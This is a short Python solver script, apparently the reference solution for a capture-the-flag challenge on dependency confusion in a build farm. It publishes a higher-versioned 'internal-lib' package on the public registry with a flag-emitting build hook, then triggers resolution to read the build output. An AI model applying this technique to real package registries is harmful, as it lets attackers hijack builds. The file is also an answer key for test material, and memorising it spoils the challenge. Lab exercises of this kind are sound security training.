#!/usr/bin/env python3
"""Reference solver for supplychain-buildfarm-depconf.

The resolver picks the highest version across the private and public registries.
Publish `internal-lib` on the public registry at a higher version with the
`emit-flag` build hook, then resolve it.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _req(url, obj=None, method="GET"):
    data = json.dumps(obj).encode() if obj is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    _req(
        base + "/publish-public",
        {"name": "internal-lib", "version": "99.0.0", "buildhook": "emit-flag"},
        "POST",
    )
    out = _req(base + "/resolve?name=internal-lib")
    return out["build"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
